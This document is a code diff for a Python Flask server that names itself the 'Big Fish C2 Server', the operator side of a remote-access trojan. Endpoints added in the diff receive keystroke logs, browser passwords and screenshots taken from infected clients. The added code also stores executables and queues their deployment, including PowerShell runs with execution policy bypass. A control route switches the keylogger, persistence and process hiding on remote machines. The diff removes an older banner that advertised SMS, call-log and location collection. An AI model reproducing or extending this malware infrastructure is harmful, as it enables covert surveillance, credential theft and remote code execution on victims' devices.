+            require_admin = request.form.get('require_admin', 'false') == 'true'
+            uploader = request.form.get('uploader', 'admin')
+            
+            if file.filename == '':
+                return jsonify({'error': 'No filename'}), 400
+            
+            # Save file
+            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+            safe_filename = f"{timestamp}_{file.filename}"
+            filepath = os.path.join(EXECUTABLES_FOLDER, safe_filename)
+            
+            file.save(filepath)
+            filesize = os.path.getsize(filepath)
+            
+            # Calculate hash
+            with open(filepath, 'rb') as f:
+                file_data = f.read()
+                hash_sha256 = hashlib.sha256(file_data).hexdigest()
+            
+            # Store in database
             conn = get_db()
-            cursor = conn.cursor()
-            current_time = time.time()
+            c = conn.cursor()
             
-            # Remove devices not seen for 30 days
-            cursor.execute('DELETE FROM devices WHERE ? - last_seen > 2592000', (current_time,))
-            
-            # Remove old media files (keep for 90 days)
-            cursor.execute('SELECT media_id, file_path FROM media WHERE ? - created_at > 7776000', (current_time,))
-            old_media = cursor.fetchall()
-            
-            for media in old_media:
-                try:
-                    if os.path.exists(media['file_path']):
-                        os.remove(media['file_path'])
-                except:
-                    pass
-            
-            cursor.execute('DELETE FROM media WHERE ? - created_at > 7776000', (current_time,))
+            exe_id = str(uuid.uuid4())
+            c.execute("""INSERT INTO executables 
+                        (id, name, description, filename, filepath, platform,
+                         require_admin, uploader, uploaded_at, hash_sha256, size)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                     (exe_id, name, description, safe_filename, filepath,
+                      platform, 1 if require_admin else 0, uploader,
+                      time.time(), hash_sha256, filesize))
             
             conn.commit()
             conn.close()
             
-            logger.info("Cleanup completed")
+            logger.info(f"[✓] Executable uploaded: {name} ({filesize} bytes)")
+            
+            return jsonify({
+                'success': True,
+                'executable_id': exe_id,
+                'name': name,
+                'hash': hash_sha256
+            })
             
         except Exception as e:
-            logger.error(f"Cleanup error: {e}")
+            logger.error(f"[✗] Upload executable error: {e}")
+            return jsonify({'error': str(e)}), 500
 
-# ============================================================================
-# MAIN
-# ============================================================================
+@app.route('/api/executable/deploy', methods=['POST'])
+def deploy_executable():
+    """Deploy executable to client"""
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        executable_id = data.get('executable_id')
+        arguments = data.get('arguments', '')
+        run_as_admin = data.get('run_as_admin', False)
+        
+        if not client_id or not executable_id:
+            return jsonify({'error': 'Missing parameters'}), 400
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Get executable info
+        c.execute("SELECT * FROM executables WHERE id = ?", (executable_id,))
+        executable = c.fetchone()
+        
+        if not executable:
+            conn.close()
+            return jsonify({'error': 'Executable not found'}), 404
+        
+        # Get client info
+        c.execute("SELECT hostname FROM clients WHERE id = ?", (client_id,))
+        client = c.fetchone()
+        
+        if not client:
+            conn.close()
+            return jsonify({'error': 'Client not found'}), 404
+        
+        # Create deployment command
+        if executable['platform'] == 'windows':
+            if executable['filename'].endswith('.ps1'):
+                command = f"powershell -ExecutionPolicy Bypass -File {executable['filename']} {arguments}"
+            elif executable['filename'].endswith('.bat'):
+                command = f"cmd /c {executable['filename']} {arguments}"
+            else:
+                command = f"{executable['filename']} {arguments}"
+        else:
+            command = f"./{executable['filename']} {arguments}"
+        
+        # Add admin requirement if needed
+        require_admin = executable['require_admin'] or run_as_admin
+        
+        # Create command record
+        cmd_id = str(uuid.uuid4())
+        c.execute("""INSERT INTO commands 
+                    (id, client_id, command, command_type, status, 
+                     created_at, require_admin, priority)
+                    VALUES (?, ?, ?, 'deploy', 'pending', ?, ?, 1)""",
+                 (cmd_id, client_id, command, time.time(), 
+                  1 if require_admin else 0))
+        
+        # Increment download count
+        c.execute("UPDATE executables SET downloads = downloads + 1 WHERE id = ?", 
+                 (executable_id,))
+        
+        conn.commit()
+        conn.close()
+        
+        logger.info(f"[✓] Executable deployment queued: {executable['name']} to {client['hostname']}")
+        
+        return jsonify({
+            'success': True,
+            'command_id': cmd_id,
+            'message': 'Deployment queued'
+        })
+        
+    except Exception as e:
+        logger.error(f"[✗] Deploy executable error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/keylog', methods=['POST'])
+def upload_keylog():
+    """Upload keylog data"""
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        keystrokes = data.get('keystrokes')
+        window_title = data.get('window_title', 'Unknown')
+        process_name = data.get('process_name', 'Unknown')
+        
+        if not client_id or not keystrokes:
+            return jsonify({'error': 'Missing data'}), 400
+        
+        # Decrypt if needed
+        if data.get('encrypted', False):
+            try:
+                keystrokes = decrypt_data(keystrokes)
+            except:
+                pass
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Store in database
+        c.execute("""INSERT INTO keylogs 
+                    (client_id, keystrokes, window_title, timestamp, process_name)
+                    VALUES (?, ?, ?, ?, ?)""",
+                 (client_id, keystrokes, window_title, time.time(), process_name))
+        
+        # Update client last keylog time
+        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
+                 (time.time(), client_id))
+        
+        conn.commit()
+        conn.close()
+        
+        logger.info(f"[✓] Keylog received from {client_id[:8]}")
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        logger.error(f"[✗] Keylog upload error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/keylogs/<client_id>', methods=['GET'])
+def get_keylogs(client_id):
+    """Get keylogs for a client"""
+    try:
+        limit = request.args.get('limit', 50, type=int)
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        c.execute("""SELECT keystrokes, window_title, timestamp, process_name
+                    FROM keylogs 
+                    WHERE client_id = ?
+                    ORDER BY timestamp DESC
+                    LIMIT ?""", (client_id, limit))
+        
+        keylogs = []
+        for row in c.fetchall():
+            keylogs.append({
+                'keystrokes': row['keystrokes'],
+                'window': row['window_title'],
+                'process': row['process_name'],
+                'timestamp': row['timestamp'],
+                'time': datetime.fromtimestamp(row['timestamp']).strftime('%H:%M:%S')
+            })
+        
+        conn.close()
+        return jsonify({'keylogs': keylogs})
+        
+    except Exception as e:
+        logger.error(f"[✗] Get keylogs error: {e}")
+        return jsonify({'keylogs': []})
+
+@app.route('/api/passwords', methods=['POST'])
+def upload_passwords():
+    """Upload extracted passwords"""
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        passwords = data.get('passwords', [])
+        
+        if not client_id or not passwords:
+            return jsonify({'error': 'Missing data'}), 400
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        for pwd in passwords:
+            browser = pwd.get('browser', 'Unknown')
+            url = pwd.get('url', '')
+            username = pwd.get('username', '')
+            password = pwd.get('password', '')
+            
+            # Encrypt password
+            encrypted_password = encrypt_data(password) if password else ''
+            
+            pwd_id = str(uuid.uuid4())
+            c.execute("""INSERT INTO passwords 
+                        (id, client_id, browser, url, username, password, 
+                         encrypted_password, timestamp)
+                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
+                     (pwd_id, client_id, browser, url, username, 
+                      password, encrypted_password, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        logger.info(f"[✓] Passwords uploaded from {client_id[:8]}: {len(passwords)}")
+        
+        return jsonify({'success': True})
+        
+    except Exception as e:
+        logger.error(f"[✗] Passwords upload error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/passwords/<client_id>', methods=['GET'])
+def get_passwords(client_id):
+    """Get passwords for a client"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        
+        c.execute("""SELECT browser, url, username, password, timestamp
+                    FROM passwords 
+                    WHERE client_id = ?
+                    ORDER BY timestamp DESC""", (client_id,))
+        
+        passwords = []
+        for row in c.fetchall():
+            passwords.append({
+                'browser': row['browser'],
+                'url': row['url'],
+                'username': row['username'],
+                'password': row['password'],  # Already decrypted
+                'timestamp': row['timestamp'],
+                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M')
+            })
+        
+        conn.close()
+        return jsonify({'passwords': passwords})
+        
+    except Exception as e:
+        logger.error(f"[✗] Get passwords error: {e}")
+        return jsonify({'passwords': []})
+
+@app.route('/api/screenshot', methods=['POST'])
+def upload_screenshot():
+    """Upload screenshot"""
+    try:
+        if 'file' not in request.files:
+            return jsonify({'error': 'No file provided'}), 400
+        
+        file = request.files['file']
+        client_id = request.form.get('client_id')
+        
+        if not client_id:
+            return jsonify({'error': 'No client ID'}), 400
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Get client folder
+        c.execute('SELECT hostname FROM clients WHERE id = ?', (client_id,))
+        client = c.fetchone()
+        
+        if not client:
+            conn.close()
+            return jsonify({'error': 'Client not found'}), 404
+        
+        # Save screenshot
+        client_folder = os.path.join(SCREENSHOTS_FOLDER, client['hostname'])
+        os.makedirs(client_folder, exist_ok=True)
+        
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        filename = f"screenshot_{timestamp}.png"
+        filepath = os.path.join(client_folder, filename)
+        
+        file.save(filepath)
+        filesize = os.path.getsize(filepath)
+        
+        # Get image dimensions (optional)
+        width = height = 0
+        try:
+            from PIL import Image
+            with Image.open(filepath) as img:
+                width, height = img.size
+        except:
+            pass
+        
+        # Store in database
+        screenshot_id = str(uuid.uuid4())
+        c.execute("""INSERT INTO screenshots 
+                    (id, client_id, timestamp, filepath, width, height, size)
+                    VALUES (?, ?, ?, ?, ?, ?, ?)""",
+                 (screenshot_id, client_id, time.time(), filepath, 
+                  width, height, filesize))
+        
+        conn.commit()
+        conn.close()
+        
+        logger.info(f"[✓] Screenshot uploaded from {client['hostname']}")
+        
+        return jsonify({
+            'success': True,
+            'screenshot_id': screenshot_id,
+            'filename': filename
+        })
+        
+    except Exception as e:
+        logger.error(f"[✗] Screenshot upload error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/screenshots/<client_id>', methods=['GET'])
+def get_screenshots(client_id):
+    """Get screenshots for a client"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        
+        c.execute("""SELECT id, timestamp, filepath, width, height, size
+                    FROM screenshots 
+                    WHERE client_id = ?
+                    ORDER BY timestamp DESC
+                    LIMIT 20""", (client_id,))
+        
+        screenshots = []
+        for row in c.fetchall():
+            screenshots.append({
+                'id': row['id'],
+                'timestamp': row['timestamp'],
+                'time': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M'),
+                'filepath': row['filepath'],
+                'dimensions': f"{row['width']}x{row['height']}" if row['width'] else 'Unknown',
+                'size': format_size(row['size']),
+                'url': f"/api/screenshot/view/{row['id']}"
+            })
+        
+        conn.close()
+        return jsonify({'screenshots': screenshots})
+        
+    except Exception as e:
+        logger.error(f"[✗] Get screenshots error: {e}")
+        return jsonify({'screenshots': []})
+
+@app.route('/api/screenshot/view/<screenshot_id>', methods=['GET'])
+def view_screenshot(screenshot_id):
+    """View screenshot"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        
+        c.execute('SELECT filepath FROM screenshots WHERE id = ?', (screenshot_id,))
+        screenshot = c.fetchone()
+        conn.close()
+        
+        if not screenshot or not os.path.exists(screenshot['filepath']):
+            return jsonify({'error': 'Screenshot not found'}), 404
+        
+        return send_file(screenshot['filepath'], mimetype='image/png')
+        
+    except Exception as e:
+        logger.error(f"[✗] View screenshot error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/stats', methods=['GET'])
+def get_system_stats():
+    """Get system statistics"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        current_time = time.time()
+        
+        # Basic stats
+        c.execute('SELECT COUNT(*) FROM clients')
+        total_clients = c.fetchone()[0]
+        
+        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
+        online_now = c.fetchone()[0]
+        
+        c.execute('SELECT COUNT(*) FROM files')
+        total_files = c.fetchone()[0]
+        
+        c.execute('SELECT SUM(filesize) FROM files')
+        total_size = c.fetchone()[0] or 0
+        
+        c.execute('SELECT COUNT(*) FROM keylogs')
+        total_keylogs = c.fetchone()[0]
+        
+        c.execute('SELECT COUNT(*) FROM passwords')
+        total_passwords = c.fetchone()[0]
+        
+        c.execute('SELECT COUNT(*) FROM executables')
+        total_executables = c.fetchone()[0]
+        
+        # OS distribution
+        c.execute("""SELECT os, COUNT(*) as count FROM clients GROUP BY os""")
+        os_dist = {row['os']: row['count'] for row in c.fetchall()}
+        
+        # Recent activity
+        c.execute("""SELECT COUNT(*) FROM commands 
+                    WHERE created_at > ?""", (current_time - 3600,))
+        hourly_commands = c.fetchone()[0]
+        
+        conn.close()
+        
+        return jsonify({
+            'total_clients': total_clients,
+            'online_now': online_now,
+            'total_files': total_files,
+            'total_size': total_size,
+            'total_size_str': format_size(total_size),
+            'total_keylogs': total_keylogs,
+            'total_passwords': total_passwords,
+            'total_executables': total_executables,
+            'os_distribution': os_dist,
+            'hourly_commands': hourly_commands,
+            'server_time': datetime.now().isoformat(),
+            'folders': {
+                'downloads': DOWNLOAD_FOLDER,
+                'executables': EXECUTABLES_FOLDER,
+                'screenshots': SCREENSHOTS_FOLDER
+            }
+        })
+        
+    except Exception as e:
+        logger.error(f"[✗] Stats error: {e}")
+        return jsonify({'error': str(e)})
+
+@app.route('/api/client/control', methods=['POST'])
+def client_control():
+    """Control client settings (keylogger, stealth, etc.)"""
+    try:
+        data = request.json
+        client_id = data.get('client_id')
+        action = data.get('action')
+        value = data.get('value', True)
+        
+        if not client_id or not action:
+            return jsonify({'error': 'Missing parameters'}), 400
+        
+        conn = get_db()
+        c = conn.cursor()
+        
+        # Update client settings
+        if action == 'keylogger':
+            c.execute("UPDATE clients SET keylogger_active = ? WHERE id = ?", 
+                     (1 if value else 0, client_id))
+            command = f"keylogger {'start' if value else 'stop'}"
+            
+        elif action == 'persistence':
+            c.execute("UPDATE clients SET persistence_set = ? WHERE id = ?", 
+                     (1 if value else 0, client_id))
+            command = f"persistence {'enable' if value else 'disable'}"
+            
+        elif action == 'stealth':
+            c.execute("UPDATE clients SET process_hidden = ? WHERE id = ?", 
+                     (1 if value else 0, client_id))
+            command = f"stealth {'enable' if value else 'disable'}"
+            
+        elif action == 'screenshot':
+            command = "screenshot"
+            value = True
+            
+        elif action == 'extract_passwords':
+            command = "extract_passwords"
+            value = True
+            
+        else:
+            conn.close()
+            return jsonify({'error': 'Invalid action'}), 400
+        
+        # Send command to client
+        cmd_id = str(uuid.uuid4())
+        c.execute("""INSERT INTO commands 
+                    (id, client_id, command, command_type, status, created_at, priority)
+                    VALUES (?, ?, ?, 'control', 'pending', ?, 10)""",
+                 (cmd_id, client_id, command, time.time()))
+        
+        conn.commit()
+        conn.close()
+        
+        return jsonify({
+            'success': True,
+            'command_id': cmd_id,
+            'message': f'Control command sent: {action}'
+        })
+        
+    except Exception as e:
+        logger.error(f"[✗] Client control error: {e}")
+        return jsonify({'error': str(e)}), 500
+
+def get_online_count():
+    """Get count of online clients"""
+    try:
+        conn = get_db()
+        c = conn.cursor()
+        current_time = time.time()
+        c.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (current_time,))
+        count = c.fetchone()[0]
+        conn.close()
+        return count
+    except:
+        return 0
+
+def format_size(size_bytes):
+    """Format file size"""
+    if size_bytes == 0:
+        return "0B"
+    
+    size_names = ["B", "KB", "MB", "GB", "TB"]
+    i = 0
+    while size_bytes >= 1024 and i < len(size_names) - 1:
+        size_bytes /= 1024
+        i += 1
+    
+    return f"{size_bytes:.2f} {size_names[i]}"
+
+# WebSocket events
+@socketio.on('connect')
+def handle_connect():
+    logger.info(f"[✓] Client connected: {request.sid}")
+    emit('connected', {'message': 'Connected to C2 server'})
+
+@socketio.on('disconnect')
+def handle_disconnect():
+    logger.info(f"[✓] Client disconnected: {request.sid}")
+
+@socketio.on('client_update')
+def handle_client_update(data):
+    """Broadcast client updates to all connected consoles"""
+    emit('client_update', data, broadcast=True)
+
+@socketio.on('command_update')
+def handle_command_update(data):
+    """Broadcast command updates"""
+    emit('command_update', data, broadcast=True)
+
+# Background tasks
+def cleanup_old_data():
+    """Clean up old data"""
+    while True:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            current_time = time.time()
+            
+            # Clean old completed commands (older than 7 days)
+            cutoff = current_time - (7 * 24 * 3600)
+            c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
+            
+            # Clean old keylogs (older than 30 days)
+            cutoff = current_time - (30 * 24 * 3600)
+            c.execute("DELETE FROM keylogs WHERE timestamp < ?", (cutoff,))
+            
+            conn.commit()
+            conn.close()
+            
+            logger.info("[✓] Cleanup completed")
+            
+        except Exception as e:
+            logger.error(f"[✗] Cleanup error: {e}")
+        
+        time.sleep(3600)  # Run every hour
+
+def update_client_status():
+    """Update client status periodically"""
+    while True:
+        try:
+            conn = get_db()
+            c = conn.cursor()
+            current_time = time.time()
+            
+            # Mark clients as offline
+            c.execute("UPDATE clients SET status = 'offline' WHERE ? - last_seen > ?",
+                     (current_time, ONLINE_THRESHOLD))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logger.error(f"[✗] Status update error: {e}")
+        
+        time.sleep(60)  # Run every minute
 
 if __name__ == '__main__':
-    # Initialize database
-    init_db()
+    PORT = int(os.environ.get('PORT', 5000))
     
-    # Start cleanup thread
+    # Start background threads
     threading.Thread(target=cleanup_old_data, daemon=True).start()
+    threading.Thread(target=update_client_status, daemon=True).start()
     
-    # Banner
-    print("""
-╔══════════════════════════════════════════════════════════╗
-║              UNIVERSAL SECURITY SERVER                  ║
-║          Cross-Platform Device Management               ║
-╚══════════════════════════════════════════════════════════╝
-
-    🌍 Platform Support:
-    • 🤖 Android Phones/Tablets
-    • 🍎 iOS/iPadOS Devices
-    • 🪟 Windows Desktop/Laptop
-    • 🐧 Linux Systems
-    • 💻 macOS Computers
+    logger.info(f"[✓] Big Fish C2 Server starting on port {PORT}")
+    logger.info(f"[✓] Encryption key: {ENCRYPTION_KEY[:20]}...")
+    logger.info(f"[✓] Download folder: {os.path.abspath(DOWNLOAD_FOLDER)}")
     
-    📊 Features:
-    • Real-time device monitoring
-    • Cross-platform command execution
-    • Media & file management
-    • SMS/Call log collection
-    • Browser data extraction
-    • Keylogger support
-    • Location tracking
-    
-    🔒 Security:
-    • Encrypted communications
-    • Role-based access control
-    • Audit logging
-    • Data retention policies
-    
-    🚀 Server Info:
-    • Database: universal_c2.db
-    • Media Folder: media/
-    • Port: 5000
-    • Web Dashboard: /
-    
-    Starting server...
-    """)
-    
-    port = int(os.environ.get('PORT', 5000))
-    app.run(
-        host='0.0.0.0',
-        port=port,
-        debug=False,
-        threaded=True,
-        ssl_context='adhoc' if os.environ.get('USE_SSL') else None
-    )
+    socketio.run(app, host='0.0.0.0', port=PORT, debug=False, allow_unsafe_werkzeug=True)
